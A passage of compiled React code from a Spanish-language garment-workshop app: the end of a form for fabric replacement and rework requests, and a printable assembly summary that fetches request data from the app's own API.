        /* @__PURE__ */ jsxs25("div", { children: [
          /* @__PURE__ */ jsx54(Label2, { htmlFor: "descripcionSuceso", children: "Descripci\xF3n del Suceso *" }),
          /* @__PURE__ */ jsx54(
            Textarea,
            {
              id: "descripcionSuceso",
              ...register("descripcionSuceso", { required: "Campo requerido" }),
              className: errors.descripcionSuceso ? "border-red-500" : "",
              rows: 3
            }
          )
        ] })
      ] })
    ] }),
    watch("type") === "repocision" && /* @__PURE__ */ jsxs25(Card, { children: [
      /* @__PURE__ */ jsx54(CardHeader, { children: /* @__PURE__ */ jsxs25(CardTitle, { className: "flex justify-between items-center", children: [
        "Informaci\xF3n del Producto",
        /* @__PURE__ */ jsxs25(Button, { type: "button", onClick: addProducto, size: "sm", children: [
          /* @__PURE__ */ jsx54(Plus, { className: "w-4 h-4 mr-2" }),
          "Agregar Producto"
        ] })
      ] }) }),
      /* @__PURE__ */ jsx54(CardContent, { children: /* @__PURE__ */ jsx54("div", { className: "space-y-6", children: productos.map((producto, productIndex) => /* @__PURE__ */ jsxs25("div", { className: "border rounded-lg p-4", children: [
        /* @__PURE__ */ jsxs25("div", { className: "flex justify-between items-center mb-4", children: [
          /* @__PURE__ */ jsxs25("h4", { className: "font-medium", children: [
            "Producto ",
            productIndex + 1
          ] }),
          productos.length > 1 && /* @__PURE__ */ jsx54(
            Button,
            {
              type: "button",
              variant: "outline",
              size: "sm",
              onClick: () => removeProducto(productIndex),
              children: /* @__PURE__ */ jsx54(Trash2, { className: "w-4 h-4" })
            }
          )
        ] }),
        /* @__PURE__ */ jsxs25("div", { className: "grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-6", children: [
          /* @__PURE__ */ jsxs25("div", { children: [
            /* @__PURE__ */ jsx54(Label2, { children: "Modelo de la Prenda *" }),
            /* @__PURE__ */ jsx54(
              Input,
              {
                value: producto.modeloPrenda,
                onChange: (e) => updateProducto(productIndex, "modeloPrenda", e.target.value),
                placeholder: "Modelo de prenda"
              }
            )
          ] }),
          /* @__PURE__ */ jsxs25("div", { children: [
            /* @__PURE__ */ jsx54(Label2, { children: "Tela *" }),
            /* @__PURE__ */ jsx54(
              Input,
              {
                value: producto.tela,
                onChange: (e) => updateProducto(productIndex, "tela", e.target.value),
                placeholder: "Tipo de tela"
              }
            )
          ] }),
          /* @__PURE__ */ jsxs25("div", { children: [
            /* @__PURE__ */ jsx54(Label2, { children: "Color *" }),
            /* @__PURE__ */ jsx54(
              Input,
              {
                value: producto.color,
                onChange: (e) => updateProducto(productIndex, "color", e.target.value),
                placeholder: "Color"
              }
            )
          ] }),
          /* @__PURE__ */ jsxs25("div", { children: [
            /* @__PURE__ */ jsx54(Label2, { children: "Tipo de Pieza *" }),
            /* @__PURE__ */ jsx54(
              Input,
              {
                value: producto.tipoPieza,
                onChange: (e) => updateProducto(productIndex, "tipoPieza", e.target.value),
                placeholder: "ej. Manga, Delantero, Cuello"
              }
            )
          ] }),
          watch("currentArea") === "corte" && /* @__PURE__ */ jsxs25("div", { children: [
            /* @__PURE__ */ jsx54(Label2, { children: "Consumo de Tela (metros)" }),
            /* @__PURE__ */ jsx54(
              Input,
              {
                type: "number",
                step: "0.1",
                min: "0",
                value: producto.consumoTela || "",
                onChange: (e) => updateProducto(productIndex, "consumoTela", parseFloat(e.target.value) || 0),
                placeholder: "0.0"
              }
            )
          ] })
        ] }),
        /* @__PURE__ */ jsxs25("div", { className: "border-t pt-4", children: [
          /* @__PURE__ */ jsxs25("div", { className: "flex justify-between items-center mb-4", children: [
            /* @__PURE__ */ jsx54(Label2, { className: "text-base font-medium", children: "Piezas Solicitadas" }),
            /* @__PURE__ */ jsxs25(
              Button,
              {
                type: "button",
                onClick: () => addProductPiece(productIndex),
                size: "sm",
                variant: "outline",
                children: [
                  /* @__PURE__ */ jsx54(Plus, { className: "w-4 h-4 mr-2" }),
                  "Agregar Pieza"
                ]
              }
            )
          ] }),
          /* @__PURE__ */ jsx54("div", { className: "space-y-3", children: producto.pieces.map((piece, pieceIndex) => /* @__PURE__ */ jsxs25("div", { className: "flex gap-4 items-end", children: [
            /* @__PURE__ */ jsxs25("div", { className: "flex-1", children: [
              /* @__PURE__ */ jsx54(Label2, { children: "Talla" }),
              /* @__PURE__ */ jsx54(
                Input,
                {
                  value: piece.talla,
                  onChange: (e) => updateProductPiece(productIndex, pieceIndex, "talla", e.target.value),
                  placeholder: "ej. S, M, L, XL"
                }
              )
            ] }),
            /* @__PURE__ */ jsxs25("div", { className: "flex-1", children: [
              /* @__PURE__ */ jsx54(Label2, { children: "Cantidad" }),
              /* @__PURE__ */ jsx54(
                Input,
                {
                  type: "number",
                  min: "1",
                  value: piece.cantidad,
                  onChange: (e) => updateProductPiece(productIndex, pieceIndex, "cantidad", parseInt(e.target.value) || 1)
                }
              )
            ] }),
            /* @__PURE__ */ jsxs25("div", { className: "flex-1", children: [
              /* @__PURE__ */ jsx54(Label2, { children: "No\xB0 Folio Original" }),
              /* @__PURE__ */ jsx54(
                Input,
                {
                  value: piece.folioOriginal || "",
                  onChange: (e) => updateProductPiece(productIndex, pieceIndex, "folioOriginal", e.target.value),
                  placeholder: "Opcional"
                }
              )
            ] }),
            producto.pieces.length > 1 && /* @__PURE__ */ jsx54(
              Button,
              {
                type: "button",
                variant: "outline",
                size: "sm",
                onClick: () => removeProductPiece(productIndex, pieceIndex),
                children: /* @__PURE__ */ jsx54(Trash2, { className: "w-4 h-4" })
              }
            )
          ] }, pieceIndex)) })
        ] })
      ] }, productIndex)) }) })
    ] }),
    watch("type") === "reproceso" && /* @__PURE__ */ jsxs25(Card, { children: [
      /* @__PURE__ */ jsx54(CardHeader, { children: /* @__PURE__ */ jsx54(CardTitle, { children: "Informaci\xF3n del Reproceso" }) }),
      /* @__PURE__ */ jsxs25(CardContent, { className: "space-y-4", children: [
        /* @__PURE__ */ jsxs25("div", { children: [
          /* @__PURE__ */ jsx54(Label2, { htmlFor: "volverHacer", children: "\xBFQu\xE9 se debe volver a hacer? *" }),
          /* @__PURE__ */ jsx54(
            Textarea,
            {
              id: "volverHacer",
              ...register("volverHacer", {
                required: watch("type") === "reproceso" ? "Campo requerido" : false
              }),
              className: errors.volverHacer ? "border-red-500" : "",
              rows: 3,
              placeholder: "Describe detalladamente qu\xE9 procesos deben repetirse..."
            }
          )
        ] }),
        /* @__PURE__ */ jsxs25("div", { children: [
          /* @__PURE__ */ jsx54(Label2, { htmlFor: "materialesImplicados", children: "Materiales Implicados *" }),
          /* @__PURE__ */ jsx54(
            Textarea,
            {
              id: "materialesImplicados",
              ...register("materialesImplicados", {
                required: watch("type") === "reproceso" ? "Campo requerido" : false
              }),
              className: errors.materialesImplicados ? "border-red-500" : "",
              rows: 3,
              placeholder: "Lista los materiales que est\xE1n involucrados en el reproceso..."
            }
          )
        ] })
      ] })
    ] }),
    watch("type") === "repocision" && /* @__PURE__ */ jsxs25(Card, { children: [
      /* @__PURE__ */ jsx54(CardHeader, { children: /* @__PURE__ */ jsxs25(CardTitle, { className: "flex justify-between items-center", children: [
        "Segunda Tela",
        /* @__PURE__ */ jsxs25("div", { className: "flex items-center space-x-2", children: [
          /* @__PURE__ */ jsx54(
            Switch3,
            {
              id: "tela-contraste",
              checked: watch("tieneTelaContraste"),
              onCheckedChange: (checked) => setValue("tieneTelaContraste", checked)
            }
          ),
          /* @__PURE__ */ jsx54(Label2, { htmlFor: "tela-contraste", children: "Activar segunda tela" })
        ] })
      ] }) }),
      watch("tieneTelaContraste") && /* @__PURE__ */ jsx54(CardContent, { children: /* @__PURE__ */ jsxs25("div", { className: "border rounded-lg p-4", children: [
        /* @__PURE__ */ jsxs25("div", { className: "flex justify-between items-center mb-4", children: [
          /* @__PURE__ */ jsx54("h4", { className: "font-medium", children: "Segunda Tela" }),
          /* @__PURE__ */ jsxs25(Button, { type: "button", onClick: addContrastPieceType, size: "sm", variant: "outline", children: [
            /* @__PURE__ */ jsx54(Plus, { className: "w-4 h-4 mr-2" }),
            "Agregar Tipo de Pieza"
          ] })
        ] }),
        /* @__PURE__ */ jsxs25("div", { className: "grid grid-cols-1 md:grid-cols-2 gap-4 mb-6", children: [
          /* @__PURE__ */ jsxs25("div", { children: [
            /* @__PURE__ */ jsx54(Label2, { children: "Segunda Tela *" }),
            /* @__PURE__ */ jsx54(
              Input,
              {
                value: contrastFabric.tela,
                onChange: (e) => setContrastFabric((prev) => ({ ...prev, tela: e.target.value })),
                placeholder: "Tipo de segunda tela"
              }
            )
          ] }),
          /* @__PURE__ */ jsxs25("div", { children: [
            /* @__PURE__ */ jsx54(Label2, { children: "Color *" }),
            /* @__PURE__ */ jsx54(
              Input,
              {
                value: contrastFabric.color,
                onChange: (e) => setContrastFabric((prev) => ({ ...prev, color: e.target.value })),
                placeholder: "Color"
              }
            )
          ] }),
          watch("currentArea") === "corte" && /* @__PURE__ */ jsxs25("div", { children: [
            /* @__PURE__ */ jsx54(Label2, { children: "Consumo de Tela (metros)" }),
            /* @__PURE__ */ jsx54(
              Input,
              {
                type: "number",
                step: "0.1",
                min: "0",
                value: contrastFabric.consumo || "",
                onChange: (e) => setContrastFabric((prev) => ({ ...prev, consumo: parseFloat(e.target.value) || 0 })),
                placeholder: "0.0"
              }
            )
          ] })
        ] }),
        /* @__PURE__ */ jsx54("div", { className: "space-y-6", children: contrastFabric.tipoPiezas.map((tipoPieza, pieceTypeIndex) => /* @__PURE__ */ jsxs25("div", { className: "border rounded-lg p-4", children: [
          /* @__PURE__ */ jsxs25("div", { className: "flex justify-between items-center mb-4", children: [
            /* @__PURE__ */ jsxs25("h5", { className: "font-medium", children: [
              "Tipo de Pieza ",
              pieceTypeIndex + 1
            ] }),
            contrastFabric.tipoPiezas.length > 1 && /* @__PURE__ */ jsx54(
              Button,
              {
                type: "button",
                variant: "outline",
                size: "sm",
                onClick: () => removeContrastPieceType(pieceTypeIndex),
                children: /* @__PURE__ */ jsx54(Trash2, { className: "w-4 h-4" })
              }
            )
          ] }),
          /* @__PURE__ */ jsxs25("div", { className: "mb-4", children: [
            /* @__PURE__ */ jsx54(Label2, { children: "Tipo de Pieza *" }),
            /* @__PURE__ */ jsx54(
              Input,
              {
                value: tipoPieza.tipoPieza,
                onChange: (e) => updateContrastPieceType(pieceTypeIndex, e.target.value),
                placeholder: "ej. Manga, Delantero, Cuello"
              }
            )
          ] }),
          /* @__PURE__ */ jsxs25("div", { className: "border-t pt-4", children: [
            /* @__PURE__ */ jsxs25("div", { className: "flex justify-between items-center mb-4", children: [
              /* @__PURE__ */ jsx54(Label2, { className: "text-base font-medium", children: "Piezas Solicitadas" }),
              /* @__PURE__ */ jsxs25(
                Button,
                {
                  type: "button",
                  onClick: () => addContrastPiece(pieceTypeIndex),
                  size: "sm",
                  variant: "outline",
                  children: [
                    /* @__PURE__ */ jsx54(Plus, { className: "w-4 h-4 mr-2" }),
                    "Agregar Pieza"
                  ]
                }
              )
            ] }),
            /* @__PURE__ */ jsx54("div", { className: "space-y-3", children: tipoPieza.pieces.map((piece, pieceIndex) => /* @__PURE__ */ jsxs25("div", { className: "flex gap-4 items-end", children: [
              /* @__PURE__ */ jsxs25("div", { className: "flex-1", children: [
                /* @__PURE__ */ jsx54(Label2, { children: "Talla" }),
                /* @__PURE__ */ jsx54(
                  Input,
                  {
                    value: piece.talla,
                    onChange: (e) => updateContrastPiece(pieceTypeIndex, pieceIndex, "talla", e.target.value),
                    placeholder: "ej. S, M, L, XL"
                  }
                )
              ] }),
              /* @__PURE__ */ jsxs25("div", { className: "flex-1", children: [
                /* @__PURE__ */ jsx54(Label2, { children: "Cantidad" }),
                /* @__PURE__ */ jsx54(
                  Input,
                  {
                    type: "number",
                    min: "1",
                    value: piece.cantidad,
                    onChange: (e) => updateContrastPiece(pieceTypeIndex, pieceIndex, "cantidad", parseInt(e.target.value) || 1)
                  }
                )
              ] }),
              /* @__PURE__ */ jsxs25("div", { className: "flex-1", children: [
                /* @__PURE__ */ jsx54(Label2, { children: "No\xB0 Folio Original" }),
                /* @__PURE__ */ jsx54(
                  Input,
                  {
                    value: piece.folioOriginal || "",
                    onChange: (e) => updateContrastPiece(pieceTypeIndex, pieceIndex, "folioOriginal", e.target.value),
                    placeholder: "Opcional"
                  }
                )
              ] }),
              tipoPieza.pieces.length > 1 && /* @__PURE__ */ jsx54(
                Button,
                {
                  type: "button",
                  variant: "outline",
                  size: "sm",
                  onClick: () => removeContrastPiece(pieceTypeIndex, pieceIndex),
                  children: /* @__PURE__ */ jsx54(Trash2, { className: "w-4 h-4" })
                }
              )
            ] }, pieceIndex)) })
          ] })
        ] }, pieceTypeIndex)) })
      ] }) })
    ] }),
    watch("currentArea") === "corte" && watch("type") === "repocision" && /* @__PURE__ */ jsxs25(Card, { children: [
      /* @__PURE__ */ jsx54(CardHeader, { children: /* @__PURE__ */ jsx54(CardTitle, { children: "C\xE1lculo de Recursos" }) }),
      /* @__PURE__ */ jsx54(CardContent, { children: /* @__PURE__ */ jsx54("div", { className: "space-y-4", children: /* @__PURE__ */ jsxs25("div", { className: "p-4 bg-gray-50 rounded-lg", children: [
        /* @__PURE__ */ jsx54("h4", { className: "font-medium mb-2", children: "Resumen de Costos" }),
        /* @__PURE__ */ jsxs25("div", { className: "space-y-2 text-sm", children: [
          productos.map((producto, index2) => producto.consumoTela && producto.consumoTela > 0 && /* @__PURE__ */ jsxs25("div", { className: "flex justify-between", children: [
            /* @__PURE__ */ jsxs25("span", { children: [
              producto.modeloPrenda,
              " - ",
              producto.tela
            ] }),
            /* @__PURE__ */ jsxs25("span", { children: [
              producto.consumoTela,
              " m \xD7 $60 = $",
              (producto.consumoTela * 60).toFixed(2)
            ] })
          ] }, index2)),
          watch("tieneTelaContraste") && watch("telaContraste.consumo") && /* @__PURE__ */ jsxs25("div", { className: "flex justify-between", children: [
            /* @__PURE__ */ jsxs25("span", { children: [
              "Segunda Tela - ",
              watch("telaContraste.tela")
            ] }),
            /* @__PURE__ */ jsxs25("span", { children: [
              watch("telaContraste.consumo"),
              " m \xD7 $60 = $",
              ((watch("telaContraste.consumo") || 0) * 60).toFixed(2)
            ] })
          ] }),
          /* @__PURE__ */ jsxs25("div", { className: "border-t pt-2 font-medium flex justify-between", children: [
            /* @__PURE__ */ jsx54("span", { children: "Total Estimado:" }),
            /* @__PURE__ */ jsxs25("span", { children: [
              "$",
              calculateResourceCost().toFixed(2)
            ] })
          ] })
        ] })
      ] }) }) })
    ] }),
    /* @__PURE__ */ jsxs25(Card, { children: [
      /* @__PURE__ */ jsx54(CardHeader, { children: /* @__PURE__ */ jsx54(CardTitle, { children: "Autorizaci\xF3n" }) }),
      /* @__PURE__ */ jsxs25(CardContent, { className: "space-y-4", children: [
        /* @__PURE__ */ jsxs25("div", { children: [
          /* @__PURE__ */ jsx54(Label2, { children: "Nivel de Urgencia *" }),
          /* @__PURE__ */ jsxs25(Select2, { value: watch("urgencia"), onValueChange: (value) => setValue("urgencia", value), children: [
            /* @__PURE__ */ jsx54(SelectTrigger2, { children: /* @__PURE__ */ jsx54(SelectValue2, {}) }),
            /* @__PURE__ */ jsx54(SelectContent2, { children: urgencyOptions.map((option) => /* @__PURE__ */ jsx54(SelectItem2, { value: option.value, children: option.label }, option.value)) })
          ] })
        ] }),
        /* @__PURE__ */ jsxs25("div", { children: [
          /* @__PURE__ */ jsx54(Label2, { htmlFor: "observaciones", children: "Otras Observaciones" }),
          /* @__PURE__ */ jsx54(
            Textarea,
            {
              id: "observaciones",
              ...register("observaciones"),
              rows: 3,
              placeholder: "Comentarios adicionales..."
            }
          )
        ] })
      ] })
    ] }),
    /* @__PURE__ */ jsxs25(Card, { children: [
      /* @__PURE__ */ jsx54(CardHeader, { children: /* @__PURE__ */ jsx54(CardTitle, { children: "Documentos de Soporte" }) }),
      /* @__PURE__ */ jsx54(CardContent, { children: /* @__PURE__ */ jsx54(
        FileUpload,
        {
          onFileSelect: setSelectedFiles,
          label: "Documentos de la Reposici\xF3n",
          description: "Adjunta documentos relacionados con la reposici\xF3n (PDF, XML)",
          maxFiles: 5,
          maxSize: 10
        }
      ) })
    ] }),
    /* @__PURE__ */ jsxs25("div", { className: "flex justify-end space-x-4", children: [
      /* @__PURE__ */ jsx54(Button, { type: "button", variant: "outline", onClick: onClose, children: "Cancelar" }),
      /* @__PURE__ */ jsxs25(
        Button,
        {
          type: "submit",
          disabled: createRepositionMutation.isPending,
          className: "bg-purple-600 hover:bg-purple-700",
          children: [
            createRepositionMutation.isPending ? "Creando..." : "Crear Solicitud",
            "              "
          ]
        }
      )
    ] })
  ] }) }) });
}

// client/src/components/repositions/RepositionDetail.tsx
import { useState as useState34 } from "react";

// client/src/components/repositions/RepositionPrintSummary.tsx
import { Fragment as Fragment9, jsx as jsx55, jsxs as jsxs26 } from "react/jsx-runtime";
function RepositionPrintSummary({ repositionId, onClose }) {
  const { data: reposition, isLoading } = useQuery({
    queryKey: ["reposition", repositionId],
    queryFn: async () => {
      const response = await fetch(`/api/repositions/${repositionId}`);
      if (!response.ok) throw new Error("Failed to fetch reposition");
      return response.json();
    }
  });
  const { data: pieces = [], isLoading: isLoadingPieces } = useQuery({
    queryKey: ["reposition-pieces", repositionId],
    queryFn: async () => {
      const response = await fetch(`/api/repositions/${repositionId}/pieces`);
      if (!response.ok) return [];
      return response.json();
    }
  });
  const handlePrint = () => {
    if (!reposition || isLoading) {
      alert("Los datos a\xFAn se est\xE1n cargando. Por favor espera un momento.");
      return;
    }
    setTimeout(() => {
      window.print();
    }, 100);
  };
  if (isLoading || isLoadingPieces) {
    return /* @__PURE__ */ jsx55("div", { className: "fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50", children: /* @__PURE__ */ jsx55("div", { className: "bg-white rounded-lg p-8", children: /* @__PURE__ */ jsxs26("div", { className: "text-center", children: [
      /* @__PURE__ */ jsx55("div", { className: "animate-spin h-8 w-8 border-4 border-purple-500 border-t-transparent rounded-full mx-auto mb-4" }),
      /* @__PURE__ */ jsx55("div", { children: "Cargando datos para impresi\xF3n..." })
    ] }) }) });
  }
  if (!reposition) return null;
  const totalCantidad = pieces.reduce((total, piece) => {
    const cantidad = typeof piece.cantidad === "number" ? piece.cantidad : parseInt(piece.cantidad) || 0;
    return total + cantidad;
  }, 0);
  return /* @__PURE__ */ jsxs26(Fragment9, { children: [
    /* @__PURE__ */ jsx55("div", { className: "fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4", children: /* @__PURE__ */ jsx55("div", { className: "bg-white rounded-lg max-w-lg w-full max-h-[90vh] overflow-y-auto", children: /* @__PURE__ */ jsxs26("div", { className: "p-4 space-y-3 print:p-0", children: [
      /* @__PURE__ */ jsxs26("div", { className: "flex justify-between items-center print:hidden", children: [
        /* @__PURE__ */ jsx55("h2", { className: "text-lg font-bold text-purple-800", children: "Resumen para Ensamble" }),
        /* @__PURE__ */ jsxs26("div", { className: "flex gap-2", children: [
          /* @__PURE__ */ jsxs26(
            Button,
            {
              onClick: handlePrint,
              className: "bg-purple-600 hover:bg-purple-700",
              size: "sm",
              disabled: isLoading || isLoadingPieces || !reposition,
              children: [
                /* @__PURE__ */ jsx55(Printer, { className: "w-4 h-4 mr-2" }),
                isLoading || isLoadingPieces ? "Cargando..." : "Imprimir"
              ]
            }
          ),
          /* @__PURE__ */ jsx55(Button, { variant: "outline", onClick: onClose, size: "sm", children: /* @__PURE__ */ jsx55(X, { className: "w-4 h-4" }) })
        ] })
      ] }),
      /* @__PURE__ */ jsx55("div", { className: "print:mt-0", children: /* @__PURE__ */ jsxs26(Card, { className: "print:shadow-none print:border-0", children: [
        /* @__PURE__ */ jsxs26(CardHeader, { className: "text-center print:pb-1 pb-3", children: [
          /* @__PURE__ */ jsxs26(CardTitle, { className: "text-lg font-bold print:text-sm", children: [
            "RESUMEN DE ",
            reposition.type === "reproceso" ? "REPROCESO" : "REPOSICI\xD3N",
            " - \xC1REA DE ENSAMBLE"
          ] }),
          /* @__PURE__ */ jsxs26("div", { className: "text-base font-semibold text-gray-700 print:text-xs", children: [
            "Folio: ",
            reposition.folio
          ] })
        ] }),
        /* @__PURE__ */ jsx55(CardContent, { className: "space-y-3 print:space-y-1 print:p-2", children: /* @__PURE__ */ jsxs26("div", { className: "grid grid-cols-1 gap-2 print:gap-1", children: [
          reposition.type === "reproceso" ? /* @__PURE__ */ jsxs26(Fragment9, { children: [
            /* @__PURE__ */ jsxs26("div", { className: "print:mb-1", children: [
              /* @__PURE__ */ jsx55("span", { className: "font-semibold text-xs print:text-xs", children: "Descripci\xF3n del Suceso:" }),
              /* @__PURE__ */ jsx55("div", { className: "mt-1 p-1 border border-gray-300 rounded text-xs print:text-xs print:p-0.5 min-h-8", children: reposition.descripcionSuceso || "" })
            ] }),
            /* @__PURE__ */ jsxs26("div", { className: "print:mb-1", children: [
              /* @__PURE__ */ jsx55("span", { className: "font-semibold text-xs print:text-xs", children: "\xBFQu\xE9 se debe volver a hacer?:" }),
              /* @__PURE__ */ jsx55("div", { className: "mt-1 p-1 border border-gray-300 rounded text-xs print:text-xs print:p-0.5 min-h-12", children: reposition.volverHacer || "" })
            ] }),
            /* @__PURE__ */ jsxs26("div", { className: "print:mb-1", children: [
              /* @__PURE__ */ jsx55("span", { className: "font-semibold text-xs print:text-xs", children: "Materiales Implicados:" }),
              /* @__PURE__ */ jsx55("div", { className: "mt-1 p-1 border border-gray-300 rounded text-xs print:text-xs print:p-0.5 min-h-8", children: reposition.materialesImplicados || "" })
            ] }),
            reposition.observaciones && /* @__PURE__ */ jsxs26("div", { className: "print:mb-1", children: [
              /* @__PURE__ */ jsx55("span", { className: "font-semibold text-xs print:text-xs", children: "Otras Observaciones:" }),
              /* @__PURE__ */ jsx55("div", { className: "mt-1 p-1 border border-gray-300 rounded text-xs print:text-xs print:p-0.5 min-h-8", children: reposition.observaciones })
            ] })
          ] }) : /* @__PURE__ */ jsxs26(Fragment9, { children: [
            /* @__PURE__ */ jsxs26("div", { className: "grid grid-cols-2 gap-2 print:gap-1", children: [
              /* @__PURE__ */ jsxs26("div", { children: [
                /* @__PURE__ */ jsx55("span", { className: "font-semibold text-xs print:text-xs", children: "No. Solicitud:" }),
                /* @__PURE__ */ jsx55("div", { className: "text-sm border-b border-dotted border-gray-400 min-h-5 pt-1 print:text-xs print:min-h-3", children: reposition.noSolicitud })
              ] }),
              /* @__PURE__ */ jsxs26("div", { children: [
                /* @__PURE__ */ jsx55("span", { className: "font-semibold text-xs print:text-xs", children: "Modelo Prenda:" }),
                /* @__PURE__ */ jsx55("div", { className: "text-sm border-b border-dotted border-gray-400 min-h-5 pt-1 print:text-xs print:min-h-3", children: reposition.modeloPrenda })
              ] })
            ] }),
            /* @__PURE__ */ jsxs26("div", { className: "grid grid-cols-2 gap-2 print:gap-1", children: [
              /* @__PURE__ */ jsxs26("div", { children: [
                /* @__PURE__ */ jsx55("span", { className: "font-semibold text-xs print:text-xs", children: "Color:" }),
                /* @__PURE__ */ jsx55("div", { className: "text-sm border-b border-dotted border-gray-400 min-h-5 pt-1 print:text-xs print:min-h-3", children: reposition.color })
              ] }),
              /* @__PURE__ */ jsxs26("div", { children: [
                /* @__PURE__ */ jsx55("span", { className: "font-semibold text-xs print:text-xs", children: "Cantidad Total:" }),
                /* @__PURE__ */ jsxs26("div", { className: "text-sm border-b border-dotted border-gray-400 min-h-5 pt-1 print:text-xs print:min-h-3", children: [
                  totalCantidad,
                  " piezas"
                ] })
              ] })
            ] }),
            pieces.length > 0 && /* @__PURE__ */ jsxs26("div", { className: "print:mb-1", children: [
              /* @__PURE__ */ jsx55("span", { className: "font-semibold text-xs print:text-xs", children: "Detalle por Talla:" }),
              /* @__PURE__ */ jsx55("div", { className: "mt-1 text-xs grid grid-cols-4 gap-1 print:grid-cols-6 print:text-xs", children: pieces.map((piece) => /* @__PURE__ */ jsxs26("div", { className: "text-center border border-gray-300 p-0.5 rounded print:p-0", children: [
                /* @__PURE__ */ jsx55("div", { className: "font-semibold print:text-xs", children: piece.talla }),
                /* @__PURE__ */ jsx55("div", { className: "print:text-xs", children: typeof piece.cantidad === "number" ? piece.cantidad : parseInt(piece.cantidad) || 0 })
              ] }, piece.id)) })
            ] }),
            /* @__PURE__ */ jsxs26("div", { className: "print:mb-1", children: [
              /* @__PURE__ */ jsx55("span", { className: "font-semibold text-xs print:text-xs", children: "Detalles de Da\xF1o:" }),
              /* @__PURE__ */ jsxs26("div", { className: "mt-1 p-1 border border-gray-300 rounded text-xs print:text-xs print:p-0.5", children: [
                /* @__PURE__ */ jsxs26("div", { className: "print:mb-0", children: [
                  /* @__PURE__ */ jsx55("strong", { children: "Causante:" }),
                  " ",
                  reposition.causanteDano
                ] }),
                /* @__PURE__ */ jsxs26("div", { children: [
                  /* @__PURE__ */ jsx55("strong", { children: "Descripci\xF3n:" }),
                  " ",
                  reposition.descripcionSuceso
                ] })
              ] })
            ] })
          ] }),
          reposition.type !== "reproceso" && /* @__PURE__ */ jsxs26("div", { className: "print:mb-1", children: [
            /* @__PURE__ */ jsx55("span", { className: "font-semibold text-xs print:text-xs", children: "Observaciones:" }),
            /* @__PURE__ */ jsx55("div", { className: "mt-1 p-1 border border-gray-300 rounded min-h-6 text-xs print:text-xs print:min-h-4 print:p-0.5", children: reposition.observaciones || "Ninguna" })
          ] }),
          /* @__PURE__ */ jsxs26("div", { className: "grid grid-cols-2 gap-2 print:gap-1 print:mb-1", children: [
            /* @__PURE__ */ jsxs26("div", { children: [
              /* @__PURE__ */ jsx55("span", { className: "font-semibold text-xs print:text-xs", children: "Fecha/Hora Inicio:" }),
              /* @__PURE__ */ jsx55("div", { className: "border-b border-gray-400 min-h-5 pt-1 text-xs print:min-h-3 print:text-xs", children: "___/___/____ ___:___" })
            ] }),
            /* @__PURE__ */ jsxs26("div", { children: [
              /* @__PURE__ */ jsx55("span", { className: "font-semibold text-xs print:text-xs", children: "Fecha/Hora Fin:" }),
              /* @__PURE__ */ jsx55("div", { className: "border-b border-gray-400 min-h-5 pt-1 text-xs print:min-h-3 print:text-xs", children: "___/___/____ ___:___" })
            ] })
          ] }),
          /* @__PURE__ */ jsx55("div", { className: "text-xs text-gray-600 print:text-xs print:mb-1", children: /* @__PURE__ */ jsxs26("div", { className: "grid grid-cols-2 gap-1 print:gap-0.5", children: [
            /* @__PURE__ */ jsxs26("div", { children: [
              /* @__PURE__ */ jsx55("strong", { children: "Solicitante:" }),
              " ",
              reposition.solicitanteNombre
            ] }),
            /* @__PURE__ */ jsxs26("div", { children: [
              /* @__PURE__ */ jsx55("strong", { children: "\xC1rea:" }),
              " ",
              reposition.solicitanteArea
            ] }),
            /* @__PURE__ */ jsxs26("div", { children: [
              /* @__PURE__ */ jsx55("strong", { children: "Urgencia:" }),
              " ",
              reposition.urgencia
            ] }),
            /* @__PURE__ */ jsxs26("div", { children: [
              /* @__PURE__ */ jsx55("strong", { children: "Causante:" }),
              " ",
              reposition.causanteDano
            ] })
          ] }) }),
          /* @__PURE__ */ jsx55("div", { className: "mt-3 pt-2 border-t print:mt-1 print:pt-1", children: /* @__PURE__ */ jsxs26("div", { className: "grid grid-cols-2 gap-4 print:gap-2", children: [
            /* @__PURE__ */ jsxs26("div", { className: "text-center", children: [
              /* @__PURE__ */ jsx55("div", { className: "border-b border-gray-400 mb-1 min-h-5 print:min-h-3" }),
              /* @__PURE__ */ jsx55("span", { className: "text-xs print:text-xs", children: "Nombre Operario" })
            ] }),
            /* @__PURE__ */ jsxs26("div", { className: "text-center", children: [
              /* @__PURE__ */ jsx55("div", { className: "border-b border-gray-400 mb-1 min-h-5 print:min-h-3" }),
              /* @__PURE__ */ jsx55("span", { className: "text-xs print:text-xs", children: "Nombre Supervisor" })
            ] })
          ] }) })
        ] }) })
      ] }) })
    ] }) }) }),
    /* @__PURE__ */ jsx55("style", { jsx: true, children: `
        @media print {
          @page {
            margin: 0.2in;
            size: letter;
          }
          
          body * {
            visibility: hidden;
          }
          
          .fixed.inset-0.bg-black.bg-opacity-50 * {
            visibility: visible;
          }
          
          .fixed.inset-0.bg-black.bg-opacity-50 {
            position: static !important;
            background: white !important;
            height: 50vh !important;
            max-height: 50vh !important;
          }
          
          .print\\:block {
            display: block !important;
          }
          
          .print\\:hidden {
            display: none !important;
          }
          
          .print\\:mt-0 {
            margin-top: 0 !important;
          }
          
          .print\\:mt-1 {
            margin-top: 0.25rem !important;
          }
          
          .print\\:mb-0 {
            margin-bottom: 0 !important;
          }
          
          .print\\:mb-1 {
            margin-bottom: 0.25rem !important;
          }
          
          .print\\:p-0 {
            padding: 0 !important;
          }
          
          .print\\:p-2 {
            padding: 0.5rem !important;
          }
          
          .print\\:p-0\\.5 {
            padding: 0.125rem !important;
          }
          
          .print\\:pb-1 {
            padding-bottom: 0.25rem !important;
          }
          
          .print\\:pt-1 {
            padding-top: 0.25rem !important;
          }
          
          .print\\:shadow-none {
            box-shadow: none !important;
          }
          
          .print\\:border-0 {
            border: none !important;
          }
          
          .print\\:space-y-1 > * + * {
            margin-top: 0.25rem !important;
          }
          
          .print\\:gap-0\\.5 {
            gap: 0.125rem !important;
          }
          
          .print\\:gap-1 {
            gap: 0.25rem !important;
          }
          
          .print\\:gap-2 {
            gap: 0.5rem !important;
          }
          
          .print\\:grid-cols-6 {
            grid-template-columns: repeat(6, minmax(0, 1fr)) !important;
          }
          
          .print\\:text-xs {
            font-size: 0.65rem !important;
            line-height: 0.9rem !important;
          }
          
          .print\\:text-sm {
            font-size: 0.75rem !important;
            line-height: 1rem !important;
          }
          
          .print\\:min-h-3 {
            min-height: 0.75rem !important;
          }
          
          .print\\:min-h-4 {
            min-height: 1rem !important;
          }
          
          .print\\:min-h-5 {
            min-height: 1.25rem !important;
          }
        }
      ` })
